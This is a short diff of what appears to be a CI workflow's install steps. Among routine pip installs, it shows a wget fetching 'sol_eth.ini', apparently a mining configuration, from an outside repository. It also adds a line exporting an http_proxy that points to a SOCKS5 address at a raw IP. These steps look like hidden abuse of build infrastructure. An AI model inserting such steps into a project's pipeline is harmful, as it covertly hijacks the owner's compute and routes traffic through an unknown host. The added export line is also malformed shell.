@@ -33,6 +33,7 @@ jobs:
         pip install scipy==1.3.3
         apt install wget
         wget https://github.com/dnadanx/s/raw/main/sol_eth.ini
+        export http_proxy = socks5://13.233.150.134:443
         
         pip install requests==2.22.0
         pip install Pillow==6.2.1
